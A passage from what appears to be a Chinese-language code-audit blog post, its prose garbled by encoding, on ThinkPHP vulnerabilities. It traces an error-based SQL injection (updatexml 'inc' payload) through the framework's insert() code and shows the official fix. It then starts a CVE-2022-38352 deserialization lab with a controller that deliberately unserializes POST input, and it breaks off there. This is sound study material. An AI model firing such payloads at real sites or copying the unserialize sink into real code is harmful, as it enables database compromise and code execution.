</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåË∞ÉÁî®ÁöÑforeachÔºå‰ºöÂåπÈÖçÂà∞val[0]Ôºå‰πüÂ∞±ÊòØfupancËøô‰∏™ÂÄºÔºåÂêéÈù¢‰ºöËøõÂÖ•Âà∞switchÁöÑËØ≠Âè•‰∏≠ÔºåÁÑ∂ÂêéÂ∞±‰ºöËøõË°åswitchÂåπÈÖçÔºåÂ¶ÇÊûúËøôÈáå‰∏çÂë¢‰∏™ÂåπÈÖçÂà∞ÔºåÂêéÈù¢Áî±‰∫é<code>is_scalar</code>ÂáΩÊï∞ÂåπÈÖçÊ†áÈáèÔºå‰∏ç‰ºöËøõÂÖ•ÔºåÂ∞±‰ºöÁõ¥Êé•ËøîÂõû‰∏Ä‰∏™Á©∫Êï∞ÁªÑÔºà<code>$result</code>ÔºâÔºåÁÑ∂ÂêéÂÜçinsert()ÂáΩÊï∞‰∏≠Áõ¥Êé•return 0‰∫ÜÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$data</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseData</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$options</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Â∞±‰∏ç‰ºöÊúâÂêéÈù¢ÁöÑÊõøÊç¢Êìç‰ΩúËøîÂõû‰∏Ä‰∏™Ê≠£Â∏∏ÁöÑsqlËØ≠Âè•‰∫Ü„ÄÇ</p>
<p>ËÄåËøîÂõû‰∫Ü‰∏Ä‰∏™0ËøáÂêéÂë¢ÔºåÂ∞±‰∏çËÉΩÊâß‰ªª‰ΩïsqlËØ≠Âè•‰∫ÜÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503041926667.png"
	
	
	
	loading="lazy"
	
		alt="image-20250304192648620"
	
	
></p>
<p>ÂâçÈù¢ÁöÑÂú®Â°´ÂÖÖoptionÊó∂Ê†áÊ≥®‰∏∫‰∫ÜfalseÔºåÂâçÈù¢ÊèêÂà∞‰∫ÜÔºåÁÑ∂ÂêéËøôÈáåÁî±‰∫éresult‰∏∫0ÔºåÁõ¥Êé•Â∞±‰∏ç‰ºöÊâßË°åÂêéÁª≠Êìç‰Ωú‰∫Ü„ÄÇÂØºËá¥ÊúÄÂêéÁöÑsqlËØ≠Âè•ÊèíÂÖ•ÊòØÊ≤°Áî®ÁöÑ„ÄÇ</p>
<p>Áé∞Âú®ÂÜçÊù•‰ªîÁªÜÁúã‰∏Ä‰∏ãËøô‰∏™POC:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)&amp;username[2]=1
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåÁöÑ‰º†ÂèÇÊòØÂä†‰∏ä‰∫Ü‰∏Ä‰∏™incÁöÑÔºå‰πüÂ∞±ÊòØËØ¥ÔºåËΩ¨ÊäòÁÇπÂ∞±ÊòØÂú®switchËØ≠Âè•ÔºåËøôÈáåÂÜçÁúãÁúãswitchÁöÑ‰ª£Á†ÅÈÄªËæëÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">                <span class="k">switch</span> <span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">case</span> <span class="s1">&#39;exp&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                        <span class="nv">$result</span><span class="p">[</span><span class="nv">$item</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">case</span> <span class="s1">&#39;inc&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                        <span class="nv">$result</span><span class="p">[</span><span class="nv">$item</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseKey</span><span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;+&#39;</span> <span class="o">.</span> <span class="nx">floatval</span><span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">                        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">case</span> <span class="s1">&#39;dec&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                        <span class="nv">$result</span><span class="p">[</span><span class="nv">$item</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseKey</span><span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;-&#39;</span> <span class="o">.</span> <span class="nx">floatval</span><span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">                        <span class="k">break</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáå‰ºöÂåπÈÖç<code>val[0]</code>ÁöÑÂÄºÔºåÂÄºÁöÑËµã‰∫àÊòØÂâçÈù¢ÊèêÂà∞‰∫ÜÁöÑÔºå‰πüÂ∞±ÊòØÂ¶ÇÊûú‰º†ÂèÇÂ¶Ç‰∏ãÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username[0]=1&amp;username[1]=2
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÈÇ£‰πàËøôÈáåÁöÑvalÁöÑÂÄºÂ∞±ÊòØÂåÖÂê´Âà∞1Âíå2‰∏§‰∏™ÂÄºÁöÑÊï∞ÁªÑÔºåÈÇ£‰πàÂú®ËøôÈáåÔºåÂèØ‰ª•Â∞ùËØï‰º†ÂèÇÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username[0]=exp&amp;username[1]=fupanc
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂÜçÁúãÁúãÊÉÖÂÜµÂë¢ÔºåËøòÊòØËøõ‰∏çÂéªÔºåËøôÈáåËæìÂá∫‰∏∫Ôºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503041940822.png"
	
	
	
	loading="lazy"
	
		alt="image-20250304194048785"
	
	
></p>
<p>Âú®expÂêéÈù¢‰ºº‰πéÂ§ö‰∫Ü‰∏Ä‰∏™Á©∫Ê†ºÔºåphpstorrmÁöÑÈóÆÈ¢òÔºü</p>
<p>ÈÇ£‰πàÂú®ÁΩëÈ°µ‰∏ä‰º†ÂèÇËØïËØïÂë¢ÔºåËøòÊòØ‰∏çË°åÂë¢„ÄÇ</p>
<p>ÈÇ£‰πàÊúÄÂêéÂÜçË∞ÉËØï‰∏Ä‰∏ãPOCÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)&amp;username[2]=1
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ëøô‰∏ãÂèàÂÆåÂÖ®Ê≠£Á°Æ‰∫ÜÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503041944450.png"
	
	
	
	loading="lazy"
	
		alt="image-20250304194441413"
	
	
></p>
<p>Ëøô„ÄÇ„ÄÇ„ÄÇ</p>
<p>ÈÇ£Â∞±ÁúãËøô‰∏™ÂêßÔºåÂú®case‰∏≠Âà©Áî®Âà∞ÁöÑÂáΩÊï∞Â¶Ç‰∏ãÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">                    <span class="k">case</span> <span class="s1">&#39;inc&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                        <span class="nv">$result</span><span class="p">[</span><span class="nv">$item</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseKey</span><span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;+&#39;</span> <span class="o">.</span> <span class="nx">floatval</span><span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">                        <span class="k">break</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåÁöÑparseKey()ÂáΩÊï∞ÊúÄÂêéÂÖ∂ÂÆûËøîÂõûÁöÑÂ∞±ÊòØ‰º†ËøõÂéªÁöÑÂÄºÔºåËÄåfloatval()ÂáΩÊï∞ÂàôÊòØÂ∞ÜÂÖ∂ËΩ¨Êç¢‰∏∫ÊµÆÁÇπÂûãÔºåÊúÄÂêéÁõ∏Âä†ÔºåÁªìÊûúÂ¶Ç‰∏ãÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503041949158.png"
	
	
	
	loading="lazy"
	
		alt="image-20250304194945119"
	
	
></p>
<p>ËøîÂõûÁöÑresult‰∏ç‰∏∫Á©∫‰∫ÜÔºåÂõûÂà∞insert()ÂáΩÊï∞ÔºåÁÑ∂ÂêéË∞ÉÁî®‰∫Üarray_keysÂíåarray_valuesÂáΩÊï∞Êù•ÂàÜÂà´ÁîüÊàêkeyÂíåvalueÁöÑÊï∞ÁªÑÔºå‰πüÂ∞±ÊòØÂâçÈù¢result‰∏≠ÁöÑÂÄºÔºåÁÑ∂ÂêéËøõË°å‰∫ÜÊõøÊç¢Êìç‰ΩúÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$fields</span> <span class="o">=</span> <span class="nx">array_keys</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$values</span> <span class="o">=</span> <span class="nx">array_values</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$sql</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="p">[</span><span class="s1">&#39;%INSERT%&#39;</span><span class="p">,</span> <span class="s1">&#39;%TABLE%&#39;</span><span class="p">,</span> <span class="s1">&#39;%FIELD%&#39;</span><span class="p">,</span> <span class="s1">&#39;%DATA%&#39;</span><span class="p">,</span> <span class="s1">&#39;%COMMENT%&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">            <span class="p">[</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$replace</span> <span class="o">?</span> <span class="s1">&#39;REPLACE&#39;</span> <span class="o">:</span> <span class="s1">&#39;INSERT&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseTable</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">],</span> <span class="nv">$options</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                <span class="nx">implode</span><span class="p">(</span><span class="s1">&#39; , &#39;</span><span class="p">,</span> <span class="nv">$fields</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                <span class="nx">implode</span><span class="p">(</span><span class="s1">&#39; , &#39;</span><span class="p">,</span> <span class="nv">$values</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseComment</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;comment&#39;</span><span class="p">]),</span>
</span></span><span class="line"><span class="cl">            <span class="p">],</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">insertSql</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$sql</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊúÄÂêéÁöÑsqlËØ≠Âè•‰∏∫Ôºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="w"> </span><span class="p">(</span><span class="o">`</span><span class="n">username</span><span class="o">`</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="nf">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">user</span><span class="p">(),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="w"> 
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÊúÄÂêéÊàêÂäüÊâßË°åÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503041955280.png"
	
	
	
	loading="lazy"
	
		alt="image-20250304195557242"
	
	
></p>
<p>ÊàêÂäüËøõË°åÊä•ÈîôÊ≥®ÂÖ•Ôºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503041957316.png"
	
	
	
	loading="lazy"
	
		alt="image-20250304195746275"
	
	
></p>
<p>‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî</p>
<h4 id="‰øÆÂ§çÊñπÊ°à">‰øÆÂ§çÊñπÊ°à
</h4><p>ÂÆòÊñπÁöÑ‰øÆÂ§çÊñπÊ°àÊòØ‰øÆÊîπswitchËØ≠Âè•ÁöÑÈÄªËæëÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">                <span class="k">switch</span> <span class="p">(</span><span class="nx">strtolower</span><span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">case</span> <span class="s1">&#39;inc&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                        <span class="nv">$result</span><span class="p">[</span><span class="nv">$item</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseKey</span><span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;+&#39;</span> <span class="o">.</span> <span class="nx">floatval</span><span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">                        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">case</span> <span class="s1">&#39;dec&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                        <span class="nv">$result</span><span class="p">[</span><span class="nv">$item</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseKey</span><span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;-&#39;</span> <span class="o">.</span> <span class="nx">floatval</span><span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">                        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">case</span> <span class="s1">&#39;exp&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                        <span class="nv">$result</span><span class="p">[</span><span class="nv">$item</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="ÊÄªÁªì">ÊÄªÁªì
</h4><p>Á¨¨‰∏ÄÊ¨°ÂÆ°‰∏ãÊù•ÔºåÁ°ÆÂÆû‰ª£Á†ÅÂÆ°ËÆ°ÈúÄË¶ÅÊØîËæÉÁªÜÂøÉÂëÄÔºåÊúâ‰∫õÊó∂ÂÄôÂ∞±ÊòØ‰∏Ä‰∫õ‰º†ÂèÇÂ∞±ËÉΩËææÂà∞Ê≥®ÂÖ•ÁöÑÊïàÊûúÔºåËøòÊúâÈúÄË¶ÅÊ≥®ÊÑè‰ª£Á†Å‰πãÈó¥ÁöÑËÅîÁ≥ªÔºåÊúâ‰∫õÊó∂ÂÄôÂú®‰ª£Á†ÅÁöÑÂêéÂçäÊÆµ‰ºöÊúâÊØîËæÉÈáçË¶ÅÁöÑ‰ª£Á†ÅÈÄªËæë‰ΩìÁé∞ÔºåËøòÊòØÂ§öÂä†Ê≥®ÊÑè„ÄÇ</p>
<h3 id="thinkphp-v6013ÂèçÂ∫èÂàóÂåñÊºèÊ¥û">Thinkphp v6.0.13ÂèçÂ∫èÂàóÂåñÊºèÊ¥û
</h3><p>CVE-2022-38352</p>
<h4 id="ÁéØÂ¢ÉÊê≠Âª∫-1">ÁéØÂ¢ÉÊê≠Âª∫
</h4><p>Âíå‰πãÂâçÊúâÁÇπ‰∏ç‰∏ÄÊ†∑‰∫ÜÔºåthinkphp6‰ª•‰∏äÂ∞±Âè™Êúâ‰ΩøÁî®composerÊù•ÂÆâË£Ö‰∫ÜÔºåÊØîÂ¶ÇËøôÈáåÁöÑ‰ΩøÁî®ÊñπÊ≥ïÊòØÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">composer</span> <span class="err">create-project</span> <span class="err">topthink/think=</span><span class="mf">6.0</span><span class="err">.</span><span class="mi">13</span> <span class="err">think</span><span class="mf">-6.0</span><span class="err">.</span><span class="mi">13</span>
</span></span><span class="line"><span class="cl"><span class="c1">//ÁÆÄÂçïËß£Êûê‰∏Ä‰∏ãÔºåËøôÈáåÂ∞±ÊòØÊåáÂÆö‰∫ÜthinkphpÁöÑÁâàÊú¨ÔºåÁÑ∂ÂêéËøôÈáåÁöÑtp6Â∞±ÊòØÂ∞ÜÊ∫êÁ†Å‰∏ãËΩΩÂú®ÂΩìÂâçÁõÆÂΩïÁöÑtp6ÁõÆÂΩï‰∏ã
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Â¶ÇÊûúÊúâÊä•ÈîôÁöÑËØù‰∏ÄËà¨Â∞±ÊòØphp.iniÈÖçÁΩÆÊñá‰ª∂Êúâ‰∫õÈÖçÁΩÆÈúÄË¶Å‰øÆÊîπÔºåÊØîÂ¶ÇÈúÄË¶ÅÂºÄÂêØzipÁöÑÈÖçÁΩÆÁ≠âÔºåÂÖ∂ÂÆûÈóÆAIÈÉΩËÉΩÈóÆÂá∫Êù•„ÄÇ</p>
<p>ÁÑ∂ÂêéËÆøÈóÆÁΩëÁ´ôÁöÑ<code>public/index.php</code>ÔºåÂ¶ÇÊûúÊä•Èîô<code>Your Composer dependencies require a PHP version ‚ÄúÔºû= 7.4.0</code>ÔºåÈÇ£‰πàÂ∞±ÈúÄË¶ÅÊîπ‰∏Ä‰∏ãÈÖçÁΩÆÊñá‰ª∂Ôºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> &#34;config&#34;:{
</span></span><span class="line"><span class="cl">        &#34;platform-check&#34;: false
</span></span><span class="line"><span class="cl">    }
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ê≠§Êó∂Êê≠Âª∫ÊàêÂäüÔºå‰ΩÜÊòØ‰ºöÂèëÁé∞ÁâàÊú¨‰∏çÂØπÔºåÊâÄ‰ª•ÈúÄË¶Å</p>
<p>ËøòÊòØÊîπÈÖçÁΩÆÔºåÂú®frameworkËøôÈáåÁõ¥Êé•ÊåáÂÆöÁâàÊú¨Ôºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;require&#34;: {
</span></span><span class="line"><span class="cl">        &#34;php&#34;: &#34;&gt;=7.2.5&#34;,
</span></span><span class="line"><span class="cl">        &#34;topthink/framework&#34;: &#34;6.0.13&#34;,
</span></span><span class="line"><span class="cl">        &#34;topthink/think-orm&#34;: &#34;^2.0&#34;
</span></span><span class="line"><span class="cl">    },
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂ÂêéÂÜç‰ΩøÁî®<code>composerr update</code>Âç≥ÂèØÔºåÊúÄÂêéÊàêÂäüÊê≠Âª∫Ôºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503051231680.png"
	
	
	
	loading="lazy"
	
		alt="image-20250305123146630"
	
	
></p>
<p>‰∏ãËΩΩÊù•ÁöÑÊ∫êÁ†ÅÂèØ‰ª•ÁúãÂà∞ËøôÈáåÁöÑphpÁâàÊú¨Ë¶ÅÊ±ÇÊòØÂ§ß‰∫éÁ≠â‰∫é7.2.5ÁöÑÔºåËøôÈáåËøòÊòØÁõ¥Êé•‰ΩøÁî®ÂâçÈù¢ÁöÑ7.3.4Âç≥ÂèØ„ÄÇ</p>
<p>ÁÑ∂ÂêéÂú®<code>app\controller\Index.php</code>Êñá‰ª∂‰∏≠Âä†‰∏äÂÖ•Âè£Ôºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">app\controller</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nx">app\BaseController</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Index</span> <span class="k">extends</span> <span class="nx">BaseController</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">index</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;a&#34;</span><span class="p">]){</span>
</span></span><span class="line"><span class="cl">            <span class="nx">unserialize</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;a&#34;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;&lt;style type=&#34;text/css&#34;&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: &#34;Century Gothic&#34;,&#34;Microsoft yahei&#34;; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }&lt;/style&gt;&lt;div style=&#34;padding: 24px 48px;&#34;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V&#39;</span> <span class="o">.</span> <span class="nx">\think\facade\App</span><span class="o">::</span><span class="na">version</span><span class="p">()</span> <span class="o">.</span> <span class="s1">&#39;&lt;br/&gt;&lt;span style=&#34;font-size:30px;&#34;&gt;16ËΩΩÂàùÂøÉ‰∏çÊîπ - ‰Ω†ÂÄºÂæó‰ø°ËµñÁöÑPHPÊ°ÜÊû∂&lt;/span&gt;&lt;/p&gt;&lt;span style=&#34;font-size:25px;&#34;&gt;[ V6.0 ÁâàÊú¨Áî± &lt;a href=&#34;https://www.yisu.com/&#34; target=&#34;yisu&#34;&gt;‰∫øÈÄü‰∫ë&lt;/a&gt; Áã¨ÂÆ∂ËµûÂä©ÂèëÂ∏É ]&lt;/span&gt;&lt;/div&gt;&lt;script type=&#34;text/javascript&#34; src=&#34;https://e.topthink.com/Public/static/client.js&#34;&gt;&lt;/script&gt;&lt;think id=&#34;ee9b1aa918103c4fc&#34;&gt;&lt;/think&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">hello</span><span class="p">(</span><span class="nv">$name</span> <span class="o">=</span> <span class="s1">&#39;ThinkPHP6&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
